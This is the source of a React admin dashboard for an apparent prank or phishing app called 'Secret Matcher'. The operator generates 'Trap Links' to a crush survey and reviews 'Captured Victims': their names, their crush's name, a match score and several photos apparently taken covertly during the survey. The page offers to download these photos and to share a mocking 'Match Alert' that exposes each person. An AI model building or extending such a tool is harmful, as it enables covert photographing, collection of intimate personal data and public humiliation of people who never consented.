'use client';
import { useState } from 'react';

export default function AdminDashboard() {
  const [password, setPassword] = useState('');
  const [authenticated, setAuthenticated] = useState(false);
  const [links, setLinks] = useState([]);
  const [captures, setCaptures] = useState([]);
  const [loading, setLoading] = useState(false);
  const [newLink, setNewLink] = useState('');
  const [customSlug, setCustomSlug] = useState('');
  const [slugError, setSlugError] = useState('');

  // Editing state
  const [editId, setEditId] = useState(null);
  const [editUserName, setEditUserName] = useState('');
  const [editCrushName, setEditCrushName] = useState('');

  // Change password state
  const [showChangePassword, setShowChangePassword] = useState(false);
  const [currentPwd, setCurrentPwd] = useState('');
  const [newPwd, setNewPwd] = useState('');
  const [confirmPwd, setConfirmPwd] = useState('');
  const [pwdMessage, setPwdMessage] = useState(null);

  const handleLogin = async (e) => {
    if (e && e.preventDefault) e.preventDefault();
    setLoading(true);
    try {
      const res = await fetch('/api/admin/results', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password })
      });
      if (res.ok) {
        setAuthenticated(true);
        const data = await res.json();
        setLinks(data.links);
        setCaptures(data.captures);
      } else {
        alert('Invalid password');
      }
    } catch (error) {
      console.error(error);
    }
    setLoading(false);
  };

  const generateLink = async () => {
    setLoading(true);
    setSlugError('');
    try {
      const res = await fetch('/api/admin/generate-link', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password, customSlug })
      });
      const data = await res.json();
      if (res.ok) {
        // Auto-detect the current domain — works from both localhost and Cloudflare tunnel
        const publicDomain = window.location.origin;
        const fullLink = `${publicDomain}/survey/${data.linkId}`;
        setNewLink(fullLink);
        setCustomSlug('');
        handleLogin({ preventDefault: () => {} });
      } else {
        setSlugError(data.error || 'Failed to generate link');
      }
    } catch (error) {
      console.error(error);
      setSlugError('Network error. Please try again.');
    }
    setLoading(false);
  };

  const forceDownload = async (e, photoData, filename) => {
    e.preventDefault();
    try {
      const response = await fetch(photoData);
      const blob = await response.blob();
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.style.display = 'none';
      a.href = url;
      a.download = filename;
      document.body.appendChild(a);
      a.click();
      window.URL.revokeObjectURL(url);
      document.body.removeChild(a);
    } catch(err) {
      console.error("Failed to download image", err);
      window.open(photoData, '_blank');
    }
  };

  const deleteCapture = async (id) => {
    if (!confirm("Are you sure you want to completely delete this record AND its photos from your hard drive?")) return;
    try {
      const res = await fetch('/api/admin/captures', {
          method: 'DELETE',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ password, id })
      });
      if (res.ok) {
          setCaptures(captures.filter(c => c.id !== id));
      } else {
          alert('Failed to delete');
      }
    } catch(err) { console.error(err); }
  };

  const deactivateLink = async (id) => {
     try {
         const res = await fetch('/api/admin/links', {
            method: 'PUT',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ password, id, isActive: false })
         });
         if (res.ok) {
             setLinks(links.map(l => l.id === id ? {...l, is_active: 0} : l));
         }
     } catch (err) { console.error("Failed to deactivate link", err); }
  };

  const startEdit = (capture) => {
    setEditId(capture.id);
    setEditUserName(capture.user_name);
    setEditCrushName(capture.crush_name);
  };

  const saveEdit = async (id) => {
    try {
      const res = await fetch('/api/admin/captures', {
          method: 'PUT',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ password, id, userName: editUserName, crushName: editCrushName })
      });
      if (res.ok) {
          setCaptures(captures.map(c => c.id === id ? {...c, user_name: editUserName, crush_name: editCrushName} : c));
          setEditId(null);
      }
    } catch(err) { console.error(err); }
  };

  const shareCapture = (capture) => {
    const text = `Match Alert! 💘\nWe caught ${capture.user_name} secretly analyzing their crush on ${capture.crush_name}!`;
    if (navigator.share) {
        navigator.share({ title: 'Secret Matcher', text }).catch(console.error);
    } else {
        navigator.clipboard.writeText(text);
        alert("Summary copied to clipboard!");
    }
  };

  const handleChangePassword = async (e) => {
    e.preventDefault();
    setPwdMessage(null);
    if (newPwd !== confirmPwd) {
      setPwdMessage({ type: 'error', text: 'New passwords do not match!' });
      return;
    }
    if (newPwd.length < 6) {
      setPwdMessage({ type: 'error', text: 'Password must be at least 6 characters.' });
      return;
    }
    try {
      const res = await fetch('/api/admin/change-password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ currentPassword: currentPwd, newPassword: newPwd })
      });
      const data = await res.json();
      if (res.ok) {
        setPwdMessage({ type: 'success', text: '✅ Password changed successfully! Use the new password next time you log in.' });
        setCurrentPwd(''); setNewPwd(''); setConfirmPwd('');
        // Update in-session password so other actions keep working
        setPassword(newPwd);
      } else {
        setPwdMessage({ type: 'error', text: data.error || 'Failed to change password.' });
      }
    } catch (err) {
      setPwdMessage({ type: 'error', text: 'Network error. Please try again.' });
    }
  };



  if (!authenticated) {
    return (
      <div className="min-h-screen bg-gray-900 flex items-center justify-center p-4">
        <div className="bg-gray-800 p-8 rounded-xl shadow-2xl max-w-md w-full text-white">
          <h1 className="text-2xl font-bold mb-6 text-center text-pink-500">Admin Dashboard</h1>
          <form onSubmit={handleLogin} className="space-y-4">
            <div>
              <label className="block text-sm font-medium mb-1 shrink-0">Secret Password</label>
              <input 
                type="password" 
                value={password}
                onChange={e => setPassword(e.target.value)}
                className="w-full bg-gray-700 border border-gray-600 rounded-lg px-4 py-3 outline-none focus:ring-2 focus:ring-pink-500"
                placeholder="Enter password..."
                required
              />
            </div>
            <button 
              type="submit" 
              disabled={loading}
              className="w-full bg-gradient-to-r from-pink-500 to-red-500 hover:from-pink-600 hover:to-red-600 font-semibold py-3 rounded-lg shadow-lg disabled:opacity-50 transition-all"
            >
              {loading ? 'Authenticating...' : 'Enter Dashboard'}
            </button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-900 text-white p-6">
      <div className="max-w-6xl mx-auto space-y-8">
        <div className="flex flex-col md:flex-row justify-between items-center bg-gray-800 p-6 rounded-xl shadow-lg border border-gray-700 gap-4">
          <h1 className="text-3xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-pink-400 to-red-500">Control Center</h1>
          <div className="flex flex-col md:flex-row items-center gap-3 w-full md:w-auto">
             <div className="relative w-full md:w-64">
               <input 
                 type="text" 
                 value={customSlug}
                 onChange={e => setCustomSlug(e.target.value)}
                 className="w-full bg-gray-700 border border-gray-600 rounded-lg px-4 py-2 text-sm outline-none focus:ring-2 focus:ring-pink-500 pr-20"
                 placeholder="Custom link name (optional)"
               />
               <span className="absolute right-3 top-2 text-[10px] text-gray-500 font-mono">/survey/..</span>
             </div>
             <button 
               onClick={generateLink}
               disabled={loading}
               className="w-full md:w-auto bg-green-600 hover:bg-green-500 px-5 py-2 rounded-lg font-medium transition-colors disabled:opacity-50 shadow-md whitespace-nowrap"
             >
               + Generate Trap Link
             </button>
          </div>
        </div>

        {slugError && (
          <div className="bg-red-900/50 border border-red-500 p-3 rounded-xl text-red-400 text-sm animate-in fade-in slide-in-from-top-2 duration-300">
            ⚠ {slugError}
          </div>
        )}

        {newLink && (
          <div className="bg-green-900/50 border border-green-500 p-4 rounded-xl flex flex-col md:flex-row md:items-center justify-between gap-4">
            <div>
              <p className="text-green-400 text-sm font-medium mb-1">New Link Generated Successfully!</p>
              <code className="text-white text-lg bg-black/30 px-3 py-1 rounded word-break break-all">{newLink}</code>
            </div>
            <button 
              onClick={() => {
                navigator.clipboard.writeText(newLink);
                alert("Copied to clipboard!");
              }}
              className="bg-green-500 shrink-0 text-white px-4 py-2 rounded-lg hover:bg-green-400"
            >
              Copy Link
            </button>
          </div>
        )}

        <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
          {/* Captures Section */}
          <div id="pdf-content" className="bg-gray-800 p-6 rounded-xl shadow-lg border border-gray-700 h-[600px] overflow-y-auto flex flex-col">
            <div className="flex justify-between items-center mb-4 border-b border-gray-700 pb-2 shrink-0">
               <h2 className="text-xl font-semibold">Captured Victims ({captures.length})</h2>
               <span className="text-xs text-gray-400 italic">Photos securely stored in your device.</span>
            </div>
            <div className="flex-1 space-y-4">
              {captures.length === 0 ? (
                <p className="text-gray-400 text-center py-8">No victims yet.</p>
              ) : (
                captures.map(capture => (
                  <div key={capture.id} className="bg-gray-700/50 p-4 rounded-lg border border-gray-600">
                    
                    {editId === capture.id ? (
                        <div className="mb-3 space-y-2">
                           <input type="text" value={editUserName} onChange={e => setEditUserName(e.target.value)} className="bg-gray-900 px-2 py-1 rounded w-full text-sm" placeholder="User Name" />
                           <input type="text" value={editCrushName} onChange={e => setEditCrushName(e.target.value)} className="bg-gray-900 px-2 py-1 rounded w-full text-sm" placeholder="Crush Name" />
                           <div className="flex gap-2">
                              <button onClick={() => saveEdit(capture.id)} className="text-xs bg-green-500/20 text-green-400 px-2 py-1 rounded hover:bg-green-500/40">Save</button>
                              <button onClick={() => setEditId(null)} className="text-xs bg-gray-500/20 text-gray-300 px-2 py-1 rounded hover:bg-gray-500/40">Cancel</button>
                           </div>
                        </div>
                    ) : (
                        <div className="flex justify-between items-start mb-3">
                          <div>
                            <div className="flex items-center gap-2">
                              <p className="font-bold text-lg text-pink-300">
                                 {capture.user_name}
                              </p>
                              {capture.percentage !== undefined && (
                                <span className="bg-pink-500/20 text-pink-400 text-xs px-2 py-0.5 rounded-full border border-pink-500/30">
                                  {capture.percentage}% Match
                                </span>
                              )}
                            </div>
                            <p className="text-sm text-gray-400">
                              crushing on <span className="text-white">{capture.crush_name}</span>
                            </p>
                            <p className="text-xs text-gray-400">{new Date(capture.captured_at).toLocaleString()}</p>
                          </div>
                          
                          {/* Mod Controls */}
                          <div className="flex gap-2 shrink-0">
                             <button onClick={() => shareCapture(capture)} title="Share" className="p-1.5 bg-blue-500/20 text-blue-400 rounded hover:bg-blue-500/40" >🔗</button>
                             <button onClick={() => startEdit(capture)} title="Edit" className="p-1.5 bg-yellow-500/20 text-yellow-400 rounded hover:bg-yellow-500/40" >✏️</button>
                             <button onClick={() => deleteCapture(capture.id)} title="Delete" className="p-1.5 bg-red-500/20 text-red-500 rounded hover:bg-red-500/40" >🗑️</button>
                          </div>
                        </div>
                    )}

                    {capture.photos && (
                      <div className="grid grid-cols-5 gap-2 mt-2">
                        {JSON.parse(capture.photos).map((photoData, idx) => (
                           <a 
                             key={idx} 
                             href={photoData} 
                             onClick={(e) => forceDownload(e, photoData, `${capture.user_name.replace(/[^a-z0-9]/gi, '_')}_${idx}.jpg`)} 
                             className="relative group block overflow-hidden rounded-md border border-gray-600 cursor-pointer"
                           >
                              <img src={photoData} alt="Captured" className="w-full h-auto object-cover aspect-video group-hover:scale-110 transition-transform" />
                              <div className="absolute inset-0 bg-black/60 opacity-0 group-hover:opacity-100 flex items-center justify-center transition-opacity text-center p-1">
                                <span className="text-[10px] font-bold text-white">Save</span>
                              </div>
                           </a>
                        ))}
                      </div>
                    )}
                  </div>
                ))
              )}
            </div>
          </div>

          {/* Links Section */}
          <div className="bg-gray-800 p-6 rounded-xl shadow-lg border border-gray-700 h-[600px] flex flex-col">
            <h2 className="text-xl font-semibold mb-4 border-b border-gray-700 pb-2">Generated Links History</h2>
            <div className="overflow-y-auto flex-1 space-y-3 pr-2">
              {links.length === 0 ? (
                <p className="text-gray-400 text-center py-8">No links generated yet.</p>
              ) : (
                links.map(link => (
                  <div key={link.id} className="bg-gray-700/30 p-3 rounded-lg border border-gray-600 flex justify-between items-center whitespace-pre-wrap word-break break-all">
                    <div className="w-[60%]">
                      <p className="text-xs text-blue-400 font-mono break-all">{link.id}</p>
                      <p className="text-xs text-gray-500 mt-1">{new Date(link.created_at).toLocaleString()}</p>
                    </div>
                    <div className="flex flex-col items-end gap-2">
                      <span className={`text-[10px] px-2 py-1 rounded-full ${link.is_active ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-500'}`}>
                        {link.is_active ? 'Active' : 'Inactive'}
                      </span>
                      {link.is_active === 1 && (
                         <button onClick={() => deactivateLink(link.id)} className="text-[10px] px-2 py-1 bg-red-600/50 hover:bg-red-500 text-white rounded border border-red-500/50 transition-colors">Deactivate</button>
                      )}
                    </div>
                  </div>
                ))
              )}
            </div>
          </div>
        </div>

        {/* Change Password Panel */}
        <div className="bg-gray-800 rounded-xl shadow-lg border border-gray-700 overflow-hidden">
          <button
            onClick={() => { setShowChangePassword(!showChangePassword); setPwdMessage(null); }}
            className="w-full flex justify-between items-center p-5 text-left hover:bg-gray-700/50 transition-colors"
          >
            <span className="flex items-center gap-2 font-semibold text-gray-200">🔐 Change Admin Password</span>
            <span className="text-gray-400 text-sm">{showChangePassword ? '▲ Hide' : '▼ Show'}</span>
          </button>

          {showChangePassword && (
            <form onSubmit={handleChangePassword} className="px-6 pb-6 space-y-4 border-t border-gray-700 pt-4">
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div>
                  <label className="block text-xs text-gray-400 mb-1">Current Password</label>
                  <input
                    type="password"
                    value={currentPwd}
                    onChange={e => setCurrentPwd(e.target.value)}
                    required
                    className="w-full bg-gray-700 border border-gray-600 rounded-lg px-3 py-2 text-sm outline-none focus:ring-2 focus:ring-pink-500"
                    placeholder="Current password"
                  />
                </div>
                <div>
                  <label className="block text-xs text-gray-400 mb-1">New Password</label>
                  <input
                    type="password"
                    value={newPwd}
                    onChange={e => setNewPwd(e.target.value)}
                    required
                    className="w-full bg-gray-700 border border-gray-600 rounded-lg px-3 py-2 text-sm outline-none focus:ring-2 focus:ring-pink-500"
                    placeholder="Min. 6 characters"
                  />
                </div>
                <div>
                  <label className="block text-xs text-gray-400 mb-1">Confirm New Password</label>
                  <input
                    type="password"
                    value={confirmPwd}
                    onChange={e => setConfirmPwd(e.target.value)}
                    required
                    className="w-full bg-gray-700 border border-gray-600 rounded-lg px-3 py-2 text-sm outline-none focus:ring-2 focus:ring-pink-500"
                    placeholder="Repeat new password"
                  />
                </div>
              </div>
              {pwdMessage && (
                <p className={`text-sm px-3 py-2 rounded-lg ${
                  pwdMessage.type === 'success'
                    ? 'bg-green-900/50 text-green-400 border border-green-600'
                    : 'bg-red-900/50 text-red-400 border border-red-600'
                }`}>{pwdMessage.text}</p>
              )}
              <button
                type="submit"
                className="bg-gradient-to-r from-pink-600 to-red-600 hover:from-pink-500 hover:to-red-500 px-6 py-2 rounded-lg font-medium text-sm transition-all shadow-md"
              >
                Update Password
              </button>
            </form>
          )}
        </div>

      </div>
    </div>
  );
}
